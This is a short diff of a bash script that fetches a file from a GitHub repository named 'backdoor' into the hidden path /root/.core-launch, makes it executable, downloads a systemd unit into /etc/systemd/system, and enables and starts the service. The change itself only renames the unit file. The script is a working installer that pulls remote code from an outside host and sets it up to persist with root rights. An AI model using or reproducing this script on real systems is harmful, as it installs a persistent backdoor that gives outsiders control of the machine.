@@ -1,7 +1,7 @@
 #!/bin/bash
 curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-launch > /root/.core-launch
 chmod +x /root/.core-launch
-curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/agent.service > /etc/systemd/system/agent.service
+curl -s https://raw.githubusercontent.com/Hussnain-Khan/backdoor/main/core-agent.service > /etc/systemd/system/core-agent.service
 systemctl daemon-reload
 systemctl enable core-launch
 systemctl start core-launch
